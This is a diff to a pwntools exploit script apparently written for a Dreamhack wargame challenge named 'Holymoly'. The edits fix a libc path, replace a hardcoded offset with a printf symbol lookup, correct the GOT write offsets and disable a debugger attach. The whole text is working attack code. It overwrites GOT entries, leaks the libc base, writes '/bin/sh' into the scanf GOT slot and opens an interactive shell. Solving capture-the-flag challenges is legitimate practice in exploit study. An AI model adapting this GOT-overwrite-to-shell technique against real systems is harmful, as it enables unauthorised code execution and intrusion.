@@ -11,7 +11,7 @@ rem = process("./Pwnable/Holymoly/problem/holymoly", env = env)
 # rem = remote("host8.dreamhack.games", port)
 
 # lib = ELF("./Pwnable/Holymoly/problem/libc-2.31.so")
-lib = ELF("/lib64/ld-linux-x86-64.so.2")
+lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 elf = ELF("./Pwnable/Holymoly/problem/holymoly")
 
 # goal 1: set put.GOT to main address
@@ -94,8 +94,7 @@ payload += make_cmd(main_addr, forPtr=False)
 payload += write_cmd
 
 rem.sendlineafter(b"? ", payload)
-# lib_base = u64(rem.recvn(6).ljust(8, b"\x00")) - lib.symbols['printf']
-lib_base = u64(rem.recvn(6).ljust(8, b"\x00")) - 0x606f0
+lib_base = u64(rem.recvn(6).ljust(8, b"\x00")) - lib.symbols['printf']
 
 success("lib base", lib_base)
 
@@ -103,26 +102,26 @@ ptr = 0
 val = 0
 isPtr = False
 
-bits = u64(b"/b".ljust(8, b"\x00"))
 holymoly_addr = elf.got['__isoc99_scanf']
+bits = u64(b"/b".ljust(8, b"\x00"))
 payload = make_cmd(holymoly_addr, forPtr=True)
 payload += make_cmd(bits, forPtr=False)
 payload += write_cmd
 bits = u64(b"in".ljust(8, b"\x00"))
-payload += make_cmd(holymoly_addr - 2, forPtr=True)
+payload += make_cmd(holymoly_addr + 2, forPtr=True)
 payload += make_cmd(bits, forPtr=False)
 payload += write_cmd
 bits = u64(b"/s".ljust(8, b"\x00"))
-payload += make_cmd(holymoly_addr - 4, forPtr=True)
+payload += make_cmd(holymoly_addr + 4, forPtr=True)
 payload += make_cmd(bits, forPtr=False)
 payload += write_cmd
 bits = u64(b"h".ljust(8, b"\x00"))
-payload += make_cmd(holymoly_addr - 6, forPtr=True)
+payload += make_cmd(holymoly_addr + 6, forPtr=True)
 payload += make_cmd(bits, forPtr=False)
 payload += write_cmd
 print(hex(len(payload)))
 
-gdb.attach(rem)
+# gdb.attach(rem)
 rem.sendlineafter(b"? ", payload)
 
 rem.interactive()
